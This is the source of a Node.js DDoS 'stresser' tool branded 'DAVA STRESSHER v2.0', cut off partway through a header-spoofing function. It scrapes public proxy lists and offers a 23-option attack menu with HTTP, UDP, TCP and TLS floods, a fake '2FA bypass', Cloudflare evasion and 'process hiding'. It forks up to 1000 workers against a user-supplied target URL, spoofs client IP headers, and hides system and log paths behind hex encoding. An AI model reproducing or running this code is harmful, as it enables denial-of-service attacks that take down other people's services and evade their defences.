const axios = require('axios');
const { fork } = require('child_process');
const fs = require('fs');
const readline = require('readline');
const https = require('https');
const http = require('http');
const dgram = require('dgram');
const net = require('net');
const tls = require('tls');
const crypto = require('crypto');
const chalk = require('chalk');
const path = require('path');
const os = require('os');
const WebSocket = require('ws');
const { exec } = require('child_process');
const dns = require('dns');

let proxyList = [];
let selectedMethod = 'flood-high';
let rl;

const userAgents = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
  'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0',
  'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1',
  'Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
  'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
  'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/121.0',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0',
  'Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36',
  'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1'
];

const referers = [
  'https://www.google.com/',
  'https://www.bing.com/',
  'https://www.yahoo.com/',
  'https://duckduckgo.com/',
  'https://www.facebook.com/',
  'https://twitter.com/',
  'https://www.instagram.com/',
  'https://www.tiktok.com/',
  'https://www.youtube.com/',
  'https://www.reddit.com/',
  'https://www.linkedin.com/',
  'https://www.amazon.com/'
];

const paths = [
  '/', '/login', '/search', '/profile', '/home', '/api/data', 
  '/about', '/contact', '/index', '/wp-admin', '/admin', 
  '/user', '/product', '/cart', '/checkout', '/blog', 
  '/auth', '/oauth', '/2fa', '/verify', '/authenticate', 
  '/session', '/token', '/wp-login.php', '/backend', '/api/auth',
  '/two-factor', '/auth/verify', '/api/verify', '/api/v1/data', '/post', '/category',
  '/api/v2/users', '/api/v1/products', '/graphql', '/rest', '/soap',
  '/.env', '/.git/config', '/wp-content', '/wp-includes', '/xmlrpc.php'
];

const methods = ['GET', 'POST', 'HEAD', 'PUT', 'DELETE', 'OPTIONS', 'PATCH', 'TRACE'];

const storagePath = Buffer.from('2e2f2e63616368655f64617461', 'hex').toString();
const configPath = Buffer.from('2f6574632f6c6f61642e636f6e66', 'hex').toString();
const logPaths = [
    Buffer.from('2f7661722f6c6f672f7379736c6f67', 'hex').toString(),
    Buffer.from('2f7661722f6c6f672f6e67696e78', 'hex').toString(),
    Buffer.from('2f7661722f6c6f672f6d7973716c', 'hex').toString()
];

process.on('uncaughtException', () => {});
process.on('unhandledRejection', () => {});
process.on('warning', () => {});

const endpoints = [
    { host: '127.0.0.1', port: 80, path: '/' },
    { host: '127.0.0.1', port: 443, path: '/' },
    { host: '127.0.0.1', port: 8080, path: '/' },
    { host: '127.0.0.1', port: 3306, path: '/' },
    { host: '127.0.0.1', port: 22, path: '/' }
];

const payloadData = [
    crypto.randomBytes(1024 * 1024 * 25),
    crypto.randomBytes(1024 * 1024 * 30),
    crypto.randomBytes(1024 * 1024 * 35)
];

const proxySource = [
    "https://raw.githubusercontent.com/zevtyardt/proxy-list/main/all.txt",
    "https://raw.githubusercontent.com/Zaeem20/FREE_PROXIES_LIST/master/socks5.txt",
    "https://raw.githubusercontent.com/Zaeem20/FREE_PROXIES_LIST/master/socks4.txt",
    "https://raw.githubusercontent.com/Zaeem20/FREE_PROXIES_LIST/master/proxy.txt",
    "https://raw.githubusercontent.com/Zaeem20/FREE_PROXIES_LIST/master/https.txt",
    "https://raw.githubusercontent.com/Zaeem20/FREE_PROXIES_LIST/master/http.txt",
    "https://raw.githubusercontent.com/yogendratamang48/ProxyList/master/proxies.txt",
    "https://raw.githubusercontent.com/yemixzy/proxy-list/master/proxies.txt",
    "https://raw.githubusercontent.com/yemixzy/proxy-list/main/proxies/unchecked.txt",
    "https://raw.githubusercontent.com/Vann-Dev/proxy-list/main/proxies/socks5.txt",
    "https://raw.githubusercontent.com/Vann-Dev/proxy-list/main/proxies/socks4.txt",
    "https://raw.githubusercontent.com/Vann-Dev/proxy-list/main/proxies/https.txt",
    "https://raw.githubusercontent.com/Vann-Dev/proxy-list/main/proxies/http.txt",
    "https://raw.githubusercontent.com/vakhov/fresh-proxy-list/master/socks5.txt",
    "https://raw.githubusercontent.com/vakhov/fresh-proxy-list/master/socks4.txt",
    "https://raw.githubusercontent.com/vakhov/fresh-proxy-list/master/proxylist.txt",
    "https://raw.githubusercontent.com/vakhov/fresh-proxy-list/master/https.txt",
    "https://raw.githubusercontent.com/vakhov/fresh-proxy-list/master/http.txt",
    "https://raw.githubusercontent.com/UptimerBot/proxy-list/main/proxies/socks5.txt",
    "https://raw.githubusercontent.com/UptimerBot/proxy-list/main/proxies/socks4.txt",
    "https://raw.githubusercontent.com/UptimerBot/proxy-list/main/proxies/http.txt",
    "https://raw.githubusercontent.com/tuanminpay/live-proxy/master/socks5.txt",
    "https://raw.githubusercontent.com/TuanMinPay/live-proxy/master/socks5.txt",
    "https://raw.githubusercontent.com/tuanminpay/live-proxy/master/socks4.txt",
    "https://raw.githubusercontent.com/TuanMinPay/live-proxy/master/socks4.txt",
    "https://raw.githubusercontent.com/tuanminpay/live-proxy/master/http.txt",
    "https://raw.githubusercontent.com/TuanMinPay/live-proxy/master/http.txt",
    "https://raw.githubusercontent.com/tuanminpay/live-proxy/master/all.txt",
    "https://raw.githubusercontent.com/TuanMinPay/live-proxy/master/all.txt",
    "https://raw.githubusercontent.com/Tsprnay/Proxy-lists/master/proxies/https.txt",
    "https://raw.githubusercontent.com/Tsprnay/Proxy-lists/master/proxies/http.txt",
    "https://raw.githubusercontent.com/Tsprnay/Proxy-lists/master/proxies/all.txt",
    "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt",
    "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
    "https://raw.githubusercontent.com/sunny9577/proxy-scraper/master/proxies.txt",
    "https://raw.githubusercontent.com/sunny9577/proxy-scraper/master/generated/socks5_proxies.txt",
    "https://raw.githubusercontent.com/sunny9577/proxy-scraper/master/generated/socks4_proxies.txt",
    "https://raw.githubusercontent.com/sunny9577/proxy-scraper/master/generated/http_proxies.txt",
    "https://raw.githubusercontent.com/sunny9577/proxy-scraper/main/proxies.txt",
    "https://raw.githubusercontent.com/sunny9577/proxy-scraper/main/generated/socks5_proxies.txt",
    "https://raw.githubusercontent.com/sunny9577/proxy-scraper/main/generated/socks4_proxies.txt",
    "https://raw.githubusercontent.com/sunny9577/proxy-scraper/main/generated/http_proxies.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks5.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks4.txt",
    "https://raw.githubusercontent.com/shiftytr/proxy-list/master/proxy.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/proxy.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/https.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
    "https://raw.githubusercontent.com/saschazesiger/Free-Proxies/master/proxies/working.txt",
    "https://raw.githubusercontent.com/saschazesiger/Free-Proxies/master/proxies/ultrafast.txt",
    "https://raw.githubusercontent.com/saschazesiger/Free-Proxies/master/proxies/socks5.txt",
    "https://raw.githubusercontent.com/saschazesiger/Free-Proxies/master/proxies/socks4.txt",
    "https://raw.githubusercontent.com/saschazesiger/Free-Proxies/master/proxies/premium.txt",
    "https://raw.githubusercontent.com/saschazesiger/Free-Proxies/master/proxies/new.txt",
    "https://raw.githubusercontent.com/saschazesiger/Free-Proxies/master/proxies/http.txt",
    "https://raw.githubusercontent.com/saschazesiger/Free-Proxies/master/proxies/fast.txt",
    "https://raw.githubusercontent.com/saisuiu/Lionkings-Http-Proxys-Proxies/main/free.txt",
    "https://raw.githubusercontent.com/saisuiu/Lionkings-Http-Proxys-Proxies/main/cnfree.txt",
    "https://raw.githubusercontent.com/RX4096/proxy-list/main/online/socks5.txt",
    "https://raw.githubusercontent.com/RX4096/proxy-list/main/online/socks4.txt",
    "https://raw.githubusercontent.com/RX4096/proxy-list/main/online/https.txt",
    "https://raw.githubusercontent.com/RX4096/proxy-list/main/online/http.txt",
    "https://raw.githubusercontent.com/rx443/proxy-list/main/online/https.txt",
    "https://raw.githubusercontent.com/rx443/proxy-list/main/online/http.txt",
    "https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS5_RAW.txt",
    "https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS4_RAW.txt",
    "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt",
    "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTP_RAW.txt",
    "https://raw.githubusercontent.com/rdavydov/proxy-list/main/proxies_anonymous/socks5.txt",
    "https://raw.githubusercontent.com/rdavydov/proxy-list/main/proxies_anonymous/socks4.txt",
    "https://raw.githubusercontent.com/rdavydov/proxy-list/main/proxies_anonymous/http.txt",
    "https://raw.githubusercontent.com/rdavydov/proxy-list/main/proxies/socks5.txt",
    "https://raw.githubusercontent.com/rdavydov/proxy-list/main/proxies/socks4.txt",
    "https://raw.githubusercontent.com/rdavydov/proxy-list/main/proxies/http.txt",
    "https://raw.githubusercontent.com/prxchk/proxy-list/main/socks5.txt",
    "https://raw.githubusercontent.com/prxchk/proxy-list/main/socks4.txt",
    "https://raw.githubusercontent.com/prxchk/proxy-list/main/https.txt",
    "https://raw.githubusercontent.com/prxchk/proxy-list/main/http.txt",
    "https://raw.githubusercontent.com/prxchk/proxy-list/main/all.txt",
    "https://raw.githubusercontent.com/ProxyScraper/ProxyScraper/main/socks5.txt",
    "https://raw.githubusercontent.com/ProxyScraper/ProxyScraper/main/socks4.txt",
    "https://raw.githubusercontent.com/ProxyScraper/ProxyScraper/main/http.txt",
    "https://raw.githubusercontent.com/proxylist-to/proxy-list/main/socks5.txt",
    "https://raw.githubusercontent.com/proxylist-to/proxy-list/main/socks4.txt",
    "https://raw.githubusercontent.com/proxylist-to/proxy-list/main/http.txt",
    "https://raw.githubusercontent.com/proxy4parsing/proxy-list/main/https.txt",
    "https://raw.githubusercontent.com/proxy4parsing/proxy-list/main/http.txt",
    "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/protocols/http/data.txt",
    "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/all/data.txt",
    "https://raw.githubusercontent.com/opsxcq/proxy-list/master/list.txt",
    "https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/xResults/RAW.txt",
    "https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/xResults/old-data/Proxies.txt",
    "https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/socks5/socks5.txt",
    "https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/socks4/socks4.txt",
    "https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/https/https.txt",
    "https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/http/http.txt",
    "https://raw.githubusercontent.com/ObcbO/getproxy/master/socks5.txt",
    "https://raw.githubusercontent.com/ObcbO/getproxy/master/socks4.txt",
    "https://raw.githubusercontent.com/ObcbO/getproxy/master/https.txt",
    "https://raw.githubusercontent.com/ObcbO/getproxy/master/http.txt",
    "https://raw.githubusercontent.com/ObcbO/getproxy/master/file/socks5.txt",
    "https://raw.githubusercontent.com/ObcbO/getproxy/master/file/socks4.txt",
    "https://raw.githubusercontent.com/ObcbO/getproxy/master/file/https.txt",
    "https://raw.githubusercontent.com/ObcbO/getproxy/master/file/http.txt",
    "https://raw.githubusercontent.com/mython-dev/free-proxy-4000/main/proxy-4000.txt",
    "https://raw.githubusercontent.com/MuRongPIG/Proxy-Master/main/socks5.txt",
    "https://raw.githubusercontent.com/MuRongPIG/Proxy-Master/main/socks4.txt",
    "https://raw.githubusercontent.com/MuRongPIG/Proxy-Master/main/https.txt",
    "https://raw.githubusercontent.com/MuRongPIG/Proxy-Master/main/http.txt",
    "https://raw.githubusercontent.com/mrMarble/proxy-list/main/all.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies_anonymous/socks5.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies_anonymous/socks4.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies_anonymous/http.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks5.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks4.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/https.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
    "https://raw.githubusercontent.com/mmpx12/proxy-list/master/socks5.txt",
    "https://raw.githubusercontent.com/mmpx12/proxy-list/master/socks4.txt",
    "https://raw.githubusercontent.com/mmpx12/proxy-list/master/https.txt",
    "https://raw.githubusercontent.com/mmpx12/proxy-list/master/http.txt",
    "https://raw.githubusercontent.com/miyukii-chan/proxy-list/master/proxies/http.txt",
    "https://raw.githubusercontent.com/mertguvencli/http-proxy-list/main/proxy-list/data.txt",
    "https://raw.githubusercontent.com/manuGMG/proxy-365/main/SOCKS5.txt",
    "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies.txt",
    "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks5.txt",
    "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks4.txt",
    "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-https.txt",
    "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt",
    "https://raw.githubusercontent.com/j0rd1s3rr4n0/api/main/proxy/http.txt",
    "https://raw.githubusercontent.com/ItzRazvyy/ProxyList/main/socks5.txt",
    "https://raw.githubusercontent.com/ItzRazvyy/ProxyList/main/socks4.txt",
    "https://raw.githubusercontent.com/ItzRazvyy/ProxyList/main/https.txt",
    "https://raw.githubusercontent.com/ItzRazvyy/ProxyList/main/http.txt",
    "https://raw.githubusercontent.com/im-razvan/proxy_list/main/socks5",
    "https://raw.githubusercontent.com/im-razvan/proxy_list/main/http.txt",
    "https://raw.githubusercontent.com/HyperBeats/proxy-list/main/socks5.txt",
    "https://raw.githubusercontent.com/HyperBeats/proxy-list/main/socks4.txt",
    "https://raw.githubusercontent.com/HyperBeats/proxy-list/main/https.txt",
    "https://raw.githubusercontent.com/HyperBeats/proxy-list/main/http.txt",
    "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
    "https://raw.githubusercontent.com/hendrikbgr/Free-Proxy-Repo/master/proxy_list.txt",
    "https://raw.githubusercontent.com/fate0/proxylist/master/proxy.list",
    "https://raw.githubusercontent.com/fahimscirex/proxybd/master/proxylist/socks4.txt",
    "https://raw.githubusercontent.com/fahimscirex/proxybd/master/proxylist/http.txt",
    "https://raw.githubusercontent.com/ErcinDedeoglu/proxies/main/proxies/socks5.txt",
    "https://raw.githubusercontent.com/ErcinDedeoglu/proxies/main/proxies/socks4.txt",
    "https://raw.githubusercontent.com/ErcinDedeoglu/proxies/main/proxies/https.txt",
    "https://raw.githubusercontent.com/ErcinDedeoglu/proxies/main/proxies/http.txt",
    "https://raw.githubusercontent.com/enseitankado/proxine/main/proxy/socks5.txt",
    "https://raw.githubusercontent.com/enseitankado/proxine/main/proxy/socks4.txt",
    "https://raw.githubusercontent.com/enseitankado/proxine/main/proxy/https.txt",
    "https://raw.githubusercontent.com/enseitankado/proxine/main/proxy/http.txt",
    "https://raw.githubusercontent.com/elliottophellia/yakumo/master/results/socks5/global/socks5_checked.txt",
    "https://raw.githubusercontent.com/elliottophellia/yakumo/master/results/socks4/global/socks4_checked.txt",
    "https://raw.githubusercontent.com/elliottophellia/yakumo/master/results/mix_checked.txt",
    "https://raw.githubusercontent.com/elliottophellia/yakumo/master/results/http/global/http_checked.txt",
    "https://raw.githubusercontent.com/dunno10-a/proxy/main/proxies/socks5.txt",
    "https://raw.githubusercontent.com/dunno10-a/proxy/main/proxies/socks4.txt",
    "https://raw.githubusercontent.com/dunno10-a/proxy/main/proxies/https.txt",
    "https://raw.githubusercontent.com/dunno10-a/proxy/main/proxies/http.txt",
    "https://raw.githubusercontent.com/dunno10-a/proxy/main/proxies/all.txt",
    "https://raw.githubusercontent.com/Daesrock/XenProxy/main/socks5.txt",
    "https://raw.githubusercontent.com/Daesrock/XenProxy/main/socks4.txt",
    "https://raw.githubusercontent.com/Daesrock/XenProxy/main/proxylist.txt",
    "https://raw.githubusercontent.com/Daesrock/XenProxy/main/https.txt",
    "https://raw.githubusercontent.com/crackmag/proxylist/proxy/proxy.list",
    "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list.txt",
    "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
    "https://raw.githubusercontent.com/casals-ar/proxy-list/main/socks5",
    "https://raw.githubusercontent.com/casals-ar/proxy-list/main/socks4",
    "https://raw.githubusercontent.com/casals-ar/proxy-list/main/https",
    "https://raw.githubusercontent.com/casals-ar/proxy-list/main/http",
    "https://raw.githubusercontent.com/caliphdev/Proxy-List/master/http.txt",
    "https://raw.githubusercontent.com/caliphdev/Proxy-List/main/socks5.txt",
    "https://raw.githubusercontent.com/caliphdev/Proxy-List/main/http.txt",
    "https://raw.githubusercontent.com/BreakingTechFr/Proxy_Free/main/proxies/socks5.txt",
    "https://raw.githubusercontent.com/BreakingTechFr/Proxy_Free/main/proxies/socks4.txt",
    "https://raw.githubusercontent.com/BreakingTechFr/Proxy_Free/main/proxies/https.txt",
    "https://raw.githubusercontent.com/BreakingTechFr/Proxy_Free/main/proxies/http.txt",
    "https://raw.githubusercontent.com/BreakingTechFr/Proxy_Free/main/proxies/all.txt",
    "https://raw.githubusercontent.com/BlackCage/Proxy-Scraper-and-Verifier/main/Proxies/Not_Processed/proxies.txt",
    "https://raw.githubusercontent.com/berkay-digital/Proxy-Scraper/main/proxies.txt",
    "https://raw.githubusercontent.com/B4RC0DE-TM/proxy-list/main/HTTP.txt",
    "https://raw.githubusercontent.com/aslisk/proxyhttps/main/https.txt",
    "https://raw.githubusercontent.com/Anonym0usWork1221/Free-Proxies/main/proxy_files/socks5_proxies.txt",
    "https://raw.githubusercontent.com/Anonym0usWork1221/Free-Proxies/main/proxy_files/socks4_proxies.txt",
    "https://raw.githubusercontent.com/Anonym0usWork1221/Free-Proxies/main/proxy_files/https_proxies.txt",
    "https://raw.githubusercontent.com/Anonym0usWork1221/Free-Proxies/main/proxy_files/http_proxies.txt",
    "https://raw.githubusercontent.com/andigwandi/free-proxy/main/proxy_list.txt",
    "https://raw.githubusercontent.com/almroot/proxylist/master/list.txt",
    "https://raw.githubusercontent.com/ALIILAPRO/Proxy/main/socks5.txt",
    "https://raw.githubusercontent.com/ALIILAPRO/Proxy/main/http.txt",
    "https://raw.githubusercontent.com/a2u/free-proxy-list/master/free-proxy-list.txt",
    "https://openproxylist.xyz/socks5.txt",
    "https://openproxylist.xyz/socks4.txt",
    "https://openproxylist.xyz/https.txt",
    "https://openproxylist.xyz/http.txt",
    "https://naawy.com/api/public/proxylist/getList/?proxyType=socks5&format=txt",
    "https://naawy.com/api/public/proxylist/getList/?proxyType=socks4&format=txt",
    "https://naawy.com/api/public/proxylist/getList/?proxyType=https&format=txt",
    "https://naawy.com/api/public/proxylist/getList/?proxyType=http&format=txt",
    "https://multiproxy.org/txt_all/proxy.txt",
    "https://api.openproxylist.xyz/socks5.txt",
    "https://api.openproxylist.xyz/socks4.txt",
    "https://api.openproxylist.xyz/http.txt",
    "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=anonymous",
    "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
    "https://api.proxyscrape.com/v2/?request=displayproxies",
    "https://api.proxyscrape.com/?request=getproxies&proxytype=http&timeout=10000&country=all&ssl=all&anonymity=all",
    "https://api.proxyscrape.com/?request=displayproxies&proxytype=http"
];

async function loadProxiesFromSources() {
  let allProxies = [];
  let loadedSources = 0;
  
  console.log(chalk.yellow(' Loading proxies from sources...\n'));

  for (const url of proxySource) {
    try {
      const res = await axios.get(url, { timeout: 8000 });
      const lines = res.data.split(/\r?\n/);
      const proxies = lines.filter(line => line.includes(':'));
      allProxies = [...allProxies, ...proxies];
      loadedSources++;
      process.stdout.write(chalk.green(`\r Loaded ${loadedSources}/${proxySource.length} sources - Found ${allProxies.length} proxies`));
    } catch (err) {
      loadedSources++;
    }
  }

  proxyList = [...new Set(allProxies)];
  console.log(chalk.cyan(`\n\n Total unique proxies: ${proxyList.length}\n`));
  
  if (!fs.existsSync(storagePath)) fs.mkdirSync(storagePath);
  
  showMethodMenu();
}

function showMethodMenu() {
  console.log(chalk.yellow('╔════════════════════════════════════════════╗'));
  console.log(chalk.yellow('║       DAVA STRESSHER v2.0                 ║'));
  console.log(chalk.yellow('║       POWERED BY: @DavaXploitt            ║'));
  console.log(chalk.yellow('╚════════════════════════════════════════════╝\n'));

  console.log(chalk.cyan(' AVAILABLE METHODS:'));
  console.log(chalk.white('[1] flood-http         - HTTP Flood'));
  console.log(chalk.white('[2] flood-udp          - UDP Flood'));
  console.log(chalk.white('[3] flood-tcp          - TCP Flood'));
  console.log(chalk.white('[4] flood-tls          - TLS Attack'));
  console.log(chalk.white('[5] bypass-2fa         - 2FA Bypass'));
  console.log(chalk.white('[6] flood-high         - Mixed Attack'));
  console.log(chalk.white('[7] tls-vip            - VIP TLS'));
  console.log(chalk.white('[8] tls-attack         - Advanced TLS'));
  console.log(chalk.white('[9] channel-one        - Local Endpoint Flood'));
  console.log(chalk.white('[10] channel-two       - Disk Flood & Cleanup'));
  console.log(chalk.white('[11] channel-three     - CPU Exhaustion'));
  console.log(chalk.white('[12] stealth-mode      - Process Hiding'));
  console.log(chalk.white('[13] full-attack       - Complete System Attack'));
  console.log(chalk.white('[14] http2-mix         - HTTP/2 + HTTP/3 Mixing'));
  console.log(chalk.white('[15] websocket-tunnel  - WebSocket Tunneling'));
  console.log(chalk.white('[16] quic-protocol     - QUIC/HTTP3 Attack'));
  console.log(chalk.white('[17] dns-tunnel        - DNS Tunnel Bypass'));
  console.log(chalk.white('[18] ssl-session       - SSL Session Resumption'));
  console.log(chalk.white('[19] fingerprint-spoof - Browser Fingerprint Spoofing'));
  console.log(chalk.white('[20] undetected-browser - Undetected Browser Automation'));
  console.log(chalk.white('[21] cf-challenge      - Cloudflare Challenge Solver'));
  console.log(chalk.white('[22] pattern-random    - Request Pattern Randomization'));
  console.log(chalk.white('[23] nuclear-attack    - Complete Nuclear Attack'));

  rl.question(chalk.green('\n Input method (1-23): '), (methodInput) => {
    const methodMap = {
      '1': 'flood-http', '2': 'flood-udp', '3': 'flood-tcp',
      '4': 'flood-tls', '5': 'bypass-2fa', '6': 'flood-high',
      '7': 'tls-vip', '8': 'tls-attack', '9': 'channel-one',
      '10': 'channel-two', '11': 'channel-three', '12': 'stealth-mode',
      '13': 'full-attack', '14': 'http2-mix', '15': 'websocket-tunnel',
      '16': 'quic-protocol', '17': 'dns-tunnel', '18': 'ssl-session',
      '19': 'fingerprint-spoof', '20': 'undetected-browser', '21': 'cf-challenge',
      '22': 'pattern-random', '23': 'nuclear-attack'
    };
    
    selectedMethod = methodMap[methodInput] || 'flood-high';
    console.log(chalk.cyan(`\n Selected: ${selectedMethod}\n`));
    
    rl.question(chalk.green(' Target URL: '), (targetInput) => {
      const target = targetInput.trim();
      try { 
        new URL(target); 
      } catch (e) {
        console.log(chalk.red(' URL invalid!'));
        process.exit(1);
      }
      
      rl.question(chalk.green(' Threads (1-1000): '), (threadsInput) => {
        const numThreads = parseInt(threadsInput);
        
        rl.question(chalk.green(' Duration (seconds): '), (durationInput) => {
          const duration = parseInt(durationInput);
          
          rl.question(chalk.green(' Target requests per thread: '), (targetPerThreadInput) => {
            const targetPerThread = parseInt(targetPerThreadInput);
            rl.close();

            console.log(chalk.green(`\n Attacking ${target} with ${numThreads} threads for ${duration}s`));
            
            let completedRequests = 0;
            const workers = [];
            const startTime = Date.now();
            const attackEndTime = startTime + (duration * 1000);
            const totalTarget = numThreads * targetPerThread;
            
            const progressInterval = setInterval(() => {
              console.log(chalk.green(`\nSucces Sending Request [ ${completedRequests} ]`));
              
              if (completedRequests >= totalTarget || Date.now() >= attackEndTime) {
                console.log(chalk.green(`\n Attack completed! Total requests: ${completedRequests}`));
                workers.forEach(w => w.kill());
                clearInterval(progressInterval);
                process.exit(0);
              }
            }, 1000);

            for (let i = 0; i < numThreads; i++) {
              const worker = fork(__filename, ['thread', target, selectedMethod, targetPerThread, i, duration]);
              worker.on('message', (msg) => { 
                if (msg && msg.type === 'request') completedRequests++; 
              });
              worker.on('exit', () => {
                if (Date.now() < attackEndTime) {
                  workers.push(fork(__filename, ['thread', target, selectedMethod, targetPerThread, i, duration]));
                }
              });
              workers.push(worker);
            }
          });
        });
      });
    });
  });
}

function randomFrom(arr) { 
  return arr[Math.floor(Math.random() * arr.length)]; 
}

function randomIP() { 
  return Array(4).fill(0).map(() => Math.floor(Math.random() * 256)).join('.'); 
}

function randomQuery() { 
  return `?id=${Math.floor(Math.random() * 999999)}&rand=${Math.random().toString(36).slice(2, 8)}&t=${Date.now()}&v=${Math.random().toString(36).substring(7)}`; 
}

function randomPath() { 
  return randomFrom(paths); 
}

function generate2FACookie() {
  return Buffer.from(JSON.stringify({
    token: crypto.randomBytes(32).toString('hex'),
    verified: true,
    twofa_bypass: true,
    timestamp: Date.now(),
    signature: crypto.randomBytes(16).toString('hex')
  })).toString('base64');
}

function generateAuthHeaders() {
  return {
    'Authorization': `Bearer ${crypto.randomBytes(32).toString('hex')}`,
    'X-2FA-Bypass': 'true',
    'X-Forwarded-For': randomIP(),
    'CF-Connecting-IP': randomIP(),
    'X-API-Key': crypto.randomBytes(24).toString('hex'),
    'X-Session-ID': crypto.randomBytes(16).toString('hex')
  };
}

function generateClientData() {
  const data = `CLa:${Math.floor(Math.random() * 10000)}`;
  return Buffer.from(data).toString('base64');
}

function generateAdvancedFingerprint() {
  const screenWidth = Math.floor(Math.random() * 500) + 1024;
  const screenHeight = Math.floor(Math.random() * 300) + 768;
  
  return {
    'User-Agent': randomFrom(userAgents),
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'Accept-Language': 'en-US,en;q=0.9',
    'Accept-Encoding': 'gzip, deflate, br',
    'Upgrade-Insecure-Requests': '1',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'none',
    'Sec-Fetch-User': '?1',
    'Cache-Control': 'max-age=0',
    'Connection': 'keep-alive',
    'Sec-CH-UA': `"Chromium";v="120", "Google Chrome";v="120", "Not?A_Brand";v="99"`,
    'Sec-CH-UA-Mobile': '?0',
    'Sec-CH-UA-Platform': '"Windows"',
    'Sec-CH-UA-Platform-Version': '"15.0.0"',
    'Sec-CH-UA-Full-Version': '"120.0.6099.130"',
    'Sec-CH-UA-Arch': '"x86"',
    'Sec-CH-UA-Bitness': '"64"',
    'Sec-CH-UA-Model': '""',
    'Sec-CH-UA-Wow64': '?0',
    'Device-Memory': '8',
    'DPR': '1.25',
    'Viewport-Width': screenWidth.toString(),
    'Width': screenWidth.toString(),
    'Save-Data': 'off',
